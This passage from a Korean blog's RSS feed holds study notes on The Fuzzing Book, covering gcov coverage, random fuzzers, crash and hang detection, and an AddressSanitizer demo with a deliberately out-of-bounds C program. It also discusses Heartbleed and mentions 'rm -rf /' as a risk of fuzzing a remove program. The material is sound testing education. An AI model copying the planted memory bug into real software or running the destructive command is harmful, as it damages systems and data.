class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> digit_high = *++s;</span><br><span class="line">            <span class="keyword">int</span> digit_low = *++s;</span><br><span class="line">            <span class="keyword">if</span> (hex_values[digit_high] &gt;= <span class="number">0</span> &amp;&amp; hex_values[digit_low] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                *t++ = hex_values[digit_high] * <span class="number">16</span> + hex_values[digit_low];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *t++ = *s;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    *t = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    init_hex_values();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> *s = argv[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">char</span> *t = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(s) + <span class="number">1</span>); <span class="comment">/* output is at most as long as input */</span></span><br><span class="line">        <span class="keyword">int</span> ret = cgi_decode(s, t);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, t);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cgi_decode: usage: cgi_decode STRING\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>파이썬과 같은 코드로 c를 짠다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc --coverage -o cgi_decode cgi_decode.c</span><br></pre></td></tr></table></figure><ul><li>컴파일 단계에서 –coverage 옵션을 준다. –coverage옵션은 런타임에 정보가 수집되도록 코드를 instrument한다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cgi_decode <span class="string">&#x27;Send+mail+to+me%40fuzzingbook.org&#x27;</span></span><br></pre></td></tr></table></figure></li><li>프로그램을 실행할 때 커버리지 정보는 파일로 자동 생성된다.</li><li>커버러지 정보는 gcov 프로그램에 의해 수집된다.</li><li>주어진 모든 소스 파일에 대해 커버리지 정보가 포함된 새로운 .gcov 파일을 생성한다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcov cgi_decode.c</span><br></pre></td></tr></table></figure></li><li>.gcov 파일에서 각 행은 호출된 횟수와 줄 번호가 앞에 붙는다. </li></ul><p><img src="https://user-images.githubusercontent.com/49066484/155462777-a1ae55fd-f95a-4d44-859e-c089ea15b972.png" alt="image"></p>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2022/02/21/2022-02-23-02_Coverage/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>The Fuzzing Book_01_Fuzzing: Breaking Things with Random Inputs</title>
      <link>https://pwnkidhn.github.io/2022/02/07/2022-02-16-01_Fuzzing/</link>
      <guid>https://pwnkidhn.github.io/2022/02/07/2022-02-16-01_Fuzzing/</guid>
      <pubDate>Mon, 07 Feb 2022 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;a href=&quot;https://www.fuzzingbook.org/html/Fuzzer.html&quot;&gt;https://www.fuzzingbook.org/html/Fuzzer.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The essence of fuzzing : Create random inputs, and see if they break things.&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;Synopsis&quot;&gt;&lt;a href=&quot;#Synopsis&quot; class=&quot;headerlink&quot; title=&quot;Synopsis&quot;&gt;&lt;/a&gt;Synopsis&lt;/h1&gt;&lt;h3 id=&quot;Fuzzing-아키텍처에-대한-소개&quot;&gt;&lt;a href=&quot;#Fuzzing-아키텍처에-대한-소개&quot; class=&quot;headerlink&quot; title=&quot;Fuzzing 아키텍처에 대한 소개&quot;&gt;&lt;/a&gt;Fuzzing 아키텍처에 대한 소개&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Fuzzer&lt;/code&gt; as a base class for fuzzers.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Runner&lt;/code&gt; as a base class for programs under test.(PUT)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Fuzzers&quot;&gt;&lt;a href=&quot;#Fuzzers&quot; class=&quot;headerlink&quot; title=&quot;Fuzzers&quot;&gt;&lt;/a&gt;Fuzzers&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/154219188-5152c41e-e362-46d6-b6b9-1e68d8b7c39d.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Fuzzer는 fuzzer들에 대한 기본 클래스로 RandomFuzzer와 같이 확장해서 쓸 쑤 있다.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fuzz() 함수는 input을 생성하여 반환한다.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;run() 함수는 fuzz()에서 생성된 input을 put에 넣어 fuzzing을 실행한다.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;runs() 함수는 반복적으로 run()을 실행한다.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><a href="https://www.fuzzingbook.org/html/Fuzzer.html">https://www.fuzzingbook.org/html/Fuzzer.html</a></p><p><strong>The essence of fuzzing : Create random inputs, and see if they break things.</strong></p><hr><h1 id="Synopsis"><a href="#Synopsis" class="headerlink" title="Synopsis"></a>Synopsis</h1><h3 id="Fuzzing-아키텍처에-대한-소개"><a href="#Fuzzing-아키텍처에-대한-소개" class="headerlink" title="Fuzzing 아키텍처에 대한 소개"></a>Fuzzing 아키텍처에 대한 소개</h3><ul><li><code>Fuzzer</code> as a base class for fuzzers.</li><li><code>Runner</code> as a base class for programs under test.(PUT)</li></ul><h2 id="Fuzzers"><a href="#Fuzzers" class="headerlink" title="Fuzzers"></a>Fuzzers</h2><p><img src="https://user-images.githubusercontent.com/49066484/154219188-5152c41e-e362-46d6-b6b9-1e68d8b7c39d.png" alt="image"></p><ul><li><p>Fuzzer는 fuzzer들에 대한 기본 클래스로 RandomFuzzer와 같이 확장해서 쓸 쑤 있다.</p></li><li><p>fuzz() 함수는 input을 생성하여 반환한다.</p></li><li><p>run() 함수는 fuzz()에서 생성된 input을 put에 넣어 fuzzing을 실행한다.</p></li><li><p>runs() 함수는 반복적으로 run()을 실행한다.</p><span id="more"></span></li></ul><h2 id="Runners"><a href="#Runners" class="headerlink" title="Runners"></a>Runners</h2><p><img src="https://user-images.githubusercontent.com/49066484/154220275-13711962-4c7d-4b9e-b417-9f033b7463c9.png" alt="image"></p><ul><li>Runner는 Fuzzer에서 생성된 fuzzed string을 input으로 받는다.</li><li>3가지 상태로 결과를 나타낸다. (PASS, FAIL or UNRESOLVED)</li><li>ProgramRunner는 external program을 input으로 주어 fuzzed input과 함께 fuzzing한다.</li><li>PrintRunner는 단순히 입력을 출력하고 PASS결과를 반환한다.</li></ul><hr><h1 id="A-Simple-Fuzzer"><a href="#A-Simple-Fuzzer" class="headerlink" title="A Simple Fuzzer"></a>A Simple Fuzzer</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzzer</span>(<span class="params">max_length: <span class="built_in">int</span> = <span class="number">100</span>, char_start: <span class="built_in">int</span> = <span class="number">32</span>, char_range: <span class="built_in">int</span> = <span class="number">32</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    string_length = random.randrange(<span class="number">0</span>, max_length + <span class="number">1</span>)</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, string_length):</span><br><span class="line">        out += <span class="built_in">chr</span>(random.randrange(char_start, char_start + char_range))</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><ul><li>위와 같이 간단하게 랜덤한 문자열을 만들 수 있다.</li><li>fuzzer(100, ord(‘a’), 26) 와 같이 사용한다면 최대길이 100인 랜덤한 소문자 알파벳 문자열을 생성한다.</li><li>fuzzer(100, ord(‘0’), 10) : 랜덤 숫자 생성</li></ul><h1 id="Fuzzing-External-Programs"><a href="#Fuzzing-External-Programs" class="headerlink" title="Fuzzing External Programs"></a>Fuzzing External Programs</h1><ul><li>퍼징된 입력으로 외부 프로그램 호출을 확인하기 위해 2단계로 진행한다.</li><li>퍼징된 데이터를 입력 파일로 만들고, 이 입력 파일을 선택한 프로그램의 input으로 준다.</li></ul><h2 id="Creating-Input-Files"><a href="#Creating-Input-Files" class="headerlink" title="Creating Input Files"></a>Creating Input Files</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">basename = <span class="string">&quot;input.txt&quot;</span></span><br><span class="line">tempdir = tempfile.mkdtemp()</span><br><span class="line">FILE = os.path.join(tempdir, basename)</span><br><span class="line"><span class="built_in">print</span>(FILE)</span><br><span class="line">data = fuzzer()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(FILE, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line">contents = <span class="built_in">open</span>(FILE).read()</span><br><span class="line"><span class="built_in">print</span>(contents)</span><br><span class="line"><span class="keyword">assert</span>(contents == data)</span><br></pre></td></tr></table></figure><ul><li>임시 파일을 만든 후 fuzzer() 결과를 파일에 쓴다.</li><li>assert를 통해 제대로 동작했는지 확인한다.</li></ul><h2 id="Invoking-External-Programs"><a href="#Invoking-External-Programs" class="headerlink" title="Invoking External Programs"></a>Invoking External Programs</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">program = <span class="string">&quot;bc&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(FILE, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;2 + 2\n&quot;</span>)</span><br><span class="line">result = subprocess.run([program, FILE],</span><br><span class="line">                        stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE, </span><br><span class="line">                        universal_newlines=<span class="literal">True</span>) </span><br></pre></td></tr></table></figure><ul><li>호출할 외부 프로그램은 계산기이며, Input으로 줄 파일에 “2+2”를 쓴다.</li><li>subprocess를 통해 계산기를 Input파일을 주고 실행시킨다.</li><li>result.stdout, result.returncode, result.stderr를 통해 subprocess로 실행시킨 bc의 결과를 알 수 있다.</li></ul><p> <img src="https://user-images.githubusercontent.com/49066484/154255563-694de7e3-76cf-4f57-9cb5-55fbcbeb649c.png" alt="image"></p><ul><li>만약 remove 프로그램에 대해 퍼징을 진행하고, 이때 모든 파일을 다 지울 수 있는 경우가 나올 확률은?<ul><li>무작위로 생성될 문자열의 길이가 1 이면서, 그 값이 / 일 경우 (rm -rf /)</li><li>1/100 * 1/32 가 된다.</li><li>즉 remove 프로그램에 대해 퍼징을 한다면 위의 확률로 모든 파일을 지울 수 있다.</li></ul></li></ul><h2 id="Long-Running-Fuzzing"><a href="#Long-Running-Fuzzing" class="headerlink" title="Long-Running Fuzzing"></a>Long-Running Fuzzing</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">trials = <span class="number">100</span></span><br><span class="line">program = <span class="string">&quot;bc&quot;</span></span><br><span class="line"></span><br><span class="line">runs = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(trials):</span><br><span class="line">    data = fuzzer()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FILE, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line">    result = subprocess.run([program, FILE],</span><br><span class="line">                            stdin=subprocess.DEVNULL,</span><br><span class="line">                            stdout=subprocess.PIPE,</span><br><span class="line">                            stderr=subprocess.PIPE,</span><br><span class="line">                            universal_newlines=<span class="literal">True</span>)</span><br><span class="line">    runs.append((data, result))</span><br><span class="line">    count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span>(data,reuslt) <span class="keyword">in</span> runs <span class="keyword">if</span> result.stderr == <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (count)</span><br><span class="line"></span><br><span class="line">    errors = [(data,result) <span class="keyword">for</span> (data,result) <span class="keyword">in</span> runs <span class="keyword">if</span> result.stderr != <span class="string">&quot;&quot;</span>]</span><br><span class="line">    (first_data, first_result) = errors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">repr</span>(first_data))</span><br><span class="line">    <span class="built_in">print</span>(first_result.stderr)</span><br><span class="line">    </span><br><span class="line">    [result.stderr <span class="keyword">for</span> (data, result) <span class="keyword">in</span> runs <span class="keyword">if</span> result.stderr != <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">and</span> <span class="string">&quot;illegal character&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.stderr </span><br><span class="line">    <span class="keyword">and</span> <span class="string">&quot;parse error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.stderr </span><br><span class="line">    <span class="keyword">and</span> <span class="string">&quot;syntax error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.stderr]</span><br><span class="line">    </span><br></pre></td></tr></table></figure><ul><li>반복문을 통해 여러번 퍼징을 할 수 있다.</li><li>정상적인 호출이 일어난 횟수와 에러가 발생한 횟수를 count할 수 있다.</li><li>발생한 에러중에서 위와 같은 에러가 아니라면 아마도 새로운 종류의 crash일 것이다. </li></ul><h1 id="Bugs-Fuzzers-Find"><a href="#Bugs-Fuzzers-Find" class="headerlink" title="Bugs Fuzzers Find"></a>Bugs Fuzzers Find</h1><h2 id="Buffer-Overflows"><a href="#Buffer-Overflows" class="headerlink" title="Buffer Overflows"></a>Buffer Overflows</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crash_if_too_long</span>(<span class="params">s</span>):</span></span><br><span class="line">    buffer = <span class="string">&quot;Thursday&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) &gt; <span class="built_in">len</span>(buffer):</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br></pre></td></tr></table></figure><ul><li>입력값이 buffer에 있는 문자열 보다 길면 Overflow임을 의미한다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">trials = <span class="number">100</span></span><br><span class="line"><span class="keyword">with</span> ExpectError():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(trials):</span><br><span class="line">        s = fuzzer()</span><br><span class="line">        crash_if_too_long(s)</span><br></pre></td></tr></table></figure><ul><li>fuzzer()함수로 fuzzed string을 만든 후 crash_if_too_long 함수에 input으로 주어 실행시킨다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154408354-96f3222d-f3b6-4eca-8db6-840c42cfb027.png" alt="image"></p><ul><li>여기서 ExpectedError 메시지가 뜨지만, Fuzzing을 통해 UnexpectedError를 발견할 수 있다.</li></ul><h2 id="Missing-Error-Checks"><a href="#Missing-Error-Checks" class="headerlink" title="Missing Error Checks"></a>Missing Error Checks</h2><ul><li>대부분 프로그래밍 언어는 예외처리 대신에 특정한 오류 코드를 사용한다.</li><li>C언어의 getchar()은 더이상 input이 가능하지 않으면 EOF를 반환한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27; &#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>프로그램이 사용자가 공백문자를 이력할 때까지 읽어들이는 상황에서</li><li>입력이 조기에 종료되었다면, getchar()은 계속 EOF을 반환할 것이며,</li><li>이는 무한 루프로 들어가게 된다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hang_if_no_space</span>(<span class="params">s</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            <span class="keyword">if</span> s[i] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>공백문자를 입력받으면 break가 된다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">trials = <span class="number">100</span></span><br><span class="line"><span class="keyword">with</span> ExpectTimeout(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(trials):</span><br><span class="line">        s = fuzzer()</span><br><span class="line">        hang_if_no_space(s)</span><br></pre></td></tr></table></figure><ul><li>ExpectTimeout(2)로 지정하고 코드를 돌리면, 2초 뒤에 TImeout Error 메시지가 뜬다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154411651-95e1cb25-3e22-49b7-a97d-88eeb5240075.png" alt="image"></p><h2 id="Rogue-Numbers"><a href="#Rogue-Numbers" class="headerlink" title="Rogue Numbers"></a>Rogue Numbers</h2><ul><li>퍼징으로 쉽게 정상적이지 않은 값을 만들 수 있고, 이는 흥미로운 행동을 야기한다. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">read_input</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = read_buffer_size();</span><br><span class="line">    <span class="keyword">char</span> *buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="comment">// fill buffer</span></span><br><span class="line">    <span class="keyword">return</span> (buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>만약 size가 프로그램 메모리보다 크면 어떻게 될 것인가.</li><li>아니면 size가 문자 수 보다 작으면, 혹은 음수이면 어떻게 될 것인가.</li><li>랜덤으로 생성된 숫자를 생성하여 퍼징은 모든 종류의 에러를 발생시킬 수 있다.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collapse_if_too_large</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(s) &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br></pre></td></tr></table></figure></li><li>s의 크기가 1000보다 크면 ValueError를 발생한다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">long_number = fuzzer(<span class="number">100</span>, <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(long_number)</span><br><span class="line"><span class="keyword">with</span> ExpectError():</span><br><span class="line">    collapse_if_too_large(long_number)</span><br></pre></td></tr></table></figure><ul><li>fuzzer()함수를 통해 무작위 숫자를 만들고, collapse_if_too_large()함수의 인자로 준다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154413271-aed376c9-d47d-48f3-b20d-b266db3f308b.png" alt="image"></p><ul><li>위와 같은 Bug를 찾을 수 있다.</li><li>하지만 누군가는 나쁜 프로그래밍이나, 언어의 문제라고 주장하지만</li><li>매일 수천명의 사람들이 프로그램을 시작하고 같은 실수를 반복한다.</li></ul><h1 id="Catching-Errors"><a href="#Catching-Errors" class="headerlink" title="Catching Errors"></a>Catching Errors</h1><ul><li>처음에 crash와 hang으로 오류를 식별할 수 있었다.</li><li>다만 오류를 감지하기 어렵다면, 우리는 추가적인 확인이 필요하다.</li></ul><h2 id="Generic-Checkers"><a href="#Generic-Checkers" class="headerlink" title="Generic Checkers"></a>Generic Checkers</h2><ul><li>C나 C++같은 언어에서 프로그램은 메모리에 대해 접근할 수 있다.</li><li>취약점이 있다면 초기화 되지 않은 메모리나, 이미 free된 메모리에도 접근할 수 있다.</li><li>런타임에 이러한 문제를 포착하는데 도움이 되는 도구가 있으며 퍼징과 결합하면 좋다.</li></ul><h3 id="Checking-Memory-Acccess"><a href="#Checking-Memory-Acccess" class="headerlink" title="Checking Memory Acccess"></a>Checking Memory Acccess</h3><ul><li>테스트 중에 문제가 있는 메모리 접근을 포착하기 위해, 특별한 메모리 검사 환경에서 C프로그램을 실행할 수 있다.</li><li>Address Sanitizer : memory corruption bug를 감지하는 도구.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;program.c&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main(int argc, char** argv) &#123;</span></span><br><span class="line"><span class="string">    /* Create an array with 100 bytes, initialized with 42 */</span></span><br><span class="line"><span class="string">    char *buf = malloc(100);</span></span><br><span class="line"><span class="string">    memset(buf, 42, 100);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Read the N-th element, with N being the first command-line argument */</span></span><br><span class="line"><span class="string">    int index = atoi(argv[1]);</span></span><br><span class="line"><span class="string">    char val = buf[index];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Clean up memory so we don&#x27;t leak */</span></span><br><span class="line"><span class="string">    free(buf);</span></span><br><span class="line"><span class="string">    return val;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>위와 같이 C코드를 생성하는 스크립트를 작성한다.</li><li>malloc으로 동적 할당을 한 후 42값을 채워준다. </li><li>프로그램 실행 시 인자로 받은 값을 인덱스로 하여 동적할당한 메모리에 접근한다.</li><li>이때 인덱스 값이 메모리를 넘어간다면 OOB 취약점이 발생한다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -fsanitize=address -g -o program program.c</span><br></pre></td></tr></table></figure></li><li>컴파일 시 -fsanitize 옵션을 활성화한다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154420060-37dcbb4c-d7eb-48bf-a72a-030d8ad6e4f6.png" alt="image"></p><ul><li>할당된 메모리보다 작은 인덱스 값을 주면 정상적으로 출력이 된다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154420247-aebacd6f-a07e-41ce-96fc-019ddad5afd4.png" alt="image"></p><ul><li>하지만 할당된 메모리를 초과하는 인덱스 값을 주면 Out of bound 에러가 발생한다.</li><li>Address Sanitizer는 어느 주소에서 취약점이 발생했는지 알려준다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154422312-d6b92886-9de9-43d8-a440-75e9c7563464.png" alt="image"></p><ul><li>gdb로 해당 주소를 확인하면 초기화가 된 공간 말고 0x15e 위치를 접근하려 한 것을 확인할 수 있다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154420461-819d25c6-123e-40c8-aba3-d76710f3da5b.png" alt="image"></p><p><img src="https://user-images.githubusercontent.com/49066484/154420544-74f132d8-b37d-4a17-97b2-84b948519c23.png" alt="image"></p><ul><li>C프로그램에서 오류를 찾고 싶다면, 퍼징과 함께 사용하면 좋다.</li><li>메모리를 더 많이 소모하지만, 버그를 찾는 데 필요한 인간의 노력에 비해 매우 저렴하다.</li><li>Out of bound는 공격자가 의도하지 않은 메모리에 엑세스, 수정이 가능 하기에 보안 위험이 있다.</li><li>대표적인 OOB 취약점으로 HeartBleed가 있다.</li></ul><h3 id="HeartBleed"><a href="#HeartBleed" class="headerlink" title="HeartBleed"></a>HeartBleed</h3><ul><li>OpenSSL 라이브러리의 보안 버그, SSL heartbeat 서비스에서 발견된 취약점</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/154430044-320cd1c6-723b-443e-92b1-de4254777c20.png" alt="image"></p><p><img src="https://user-images.githubusercontent.com/49066484/154430311-cd6a27e5-0140-428e-9647-5c1cb11f0bc5.png" alt="image"></p><p><img src="https://user-images.githubusercontent.com/49066484/154430675-bb049b9a-c726-42ad-93c1-bb1aa1d06279.png" alt="image"></p><ul><li>OpenSSL에서 이러한 메모리에는 암호화 인증서, 개인 키 등이 포함 될 수 있으며</li><li>메모리에 엑세스한 사실을 아무도 알아채지 못했다.</li><li>하지만 Address Sanitizer로 OpenSSL 라이브러리를 컴파일한 후에</li><li>Out of bound가 발생했음을 알아차렸다.</li></ul><h3 id="Information-Leaks"><a href="#Information-Leaks" class="headerlink" title="Information Leaks"></a>Information Leaks</h3><ul><li>Memory Leak은 illegal한 메모리 접근에 대해서만 발생하는 것이 아닌, 유효한 메모리 내에서도 발생할 수 있다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secrets = (<span class="string">&quot;&lt;space for reply&gt;&quot;</span> + fuzzer(<span class="number">100</span>) +</span><br><span class="line">           <span class="string">&quot;&lt;secret-certificate&gt;&quot;</span> + fuzzer(<span class="number">100</span>) +</span><br><span class="line">           <span class="string">&quot;&lt;secret-key&gt;&quot;</span> + fuzzer(<span class="number">100</span>) + <span class="string">&quot;&lt;other-secrets&gt;&quot;</span>)</span><br><span class="line">         </span><br><span class="line">uninitialized_memory_marker = <span class="string">&quot;deadbeef&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(secrets) &lt; <span class="number">2048</span>:</span><br><span class="line">    secrets += 